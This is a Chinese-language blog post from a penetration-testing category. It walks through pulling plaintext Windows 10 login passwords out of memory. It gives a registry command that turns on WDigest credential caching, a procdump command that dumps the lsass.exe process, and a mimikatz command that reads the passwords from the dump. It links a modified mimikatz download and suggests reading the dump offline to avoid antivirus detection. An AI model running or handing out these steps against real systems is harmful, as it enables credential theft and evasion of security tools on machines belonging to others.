---
title: Windows10明文密码抓取
copyright: true
categories: 内网渗透
tags:
  - mimikatz
  - 内网渗透
  - Windows
  - 密码抓取
abbrlink: b500df40
date: 2020-01-21 17:37:37
---

<blockquote class="blockquote-center">桃李春风一杯酒，江湖夜雨十年灯</blockquote>
　　在默认情况下，当系统为win10时，系统默认在内存缓存中是禁止保存明文密码，所以要想使用mimikatz抓取明文账号密码，还得重新配置注册表并重登系统才能抓取明文。

<!-- more -->

**procdump+mimikatz获取win10用户明文密码**

**测试环境：**Win10 企业版LTSC 1809

**工具下载：**k8版本的[mz64.exe](https://github.com/k8gege/K8tools/raw/master/mz64.exe)、[procdumpv9.0](https://download.sysinternals.com/files/Procdump.zip)

**原理：**获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码

**利用前提：**拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中

**抓取明文：**修改注册表，等待系统重新登录，截取dmp文件

### 先修改注册表

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```


　　修改完之后，重新登录账号，此时抓出来的密码就是明文显示。

　　在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，如下图，密码字段显示为null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。

![](https://img-blog.csdnimg.cn/20200121171859801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)



### 重登系统后，抓取dmp文件

管理员权限运行

```
procdump64.exe -accepteula -ma lsass.exe 1.dmp
```

![](https://img-blog.csdnimg.cn/20200121172434448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

也可以在任务管理器中导出文件，这里需要注意AppData隐藏文件夹

![](https://img-blog.csdnimg.cn/20200121172458293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)



### 把dmp文件导出到本地使用mimikatz读取密码

　　`我这里是直接在机器上运行mimikatz读取密码了，在实际运用中一般会导出到本地再读取密码，这样才能躲避杀软检测流量特征。对了，这里需要注意的是，一开始我是用官方2.2.0、2.1.1版本的mz通通报错，google发现这应该是跟mz版本还有win10版本有关。`

![](https://img-blog.csdnimg.cn/20200121172517900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

```
mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
```


这里我用了k8的mz才没有报错，成功读出win10的明文密码


![](https://img-blog.csdnimg.cn/20200121172529799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)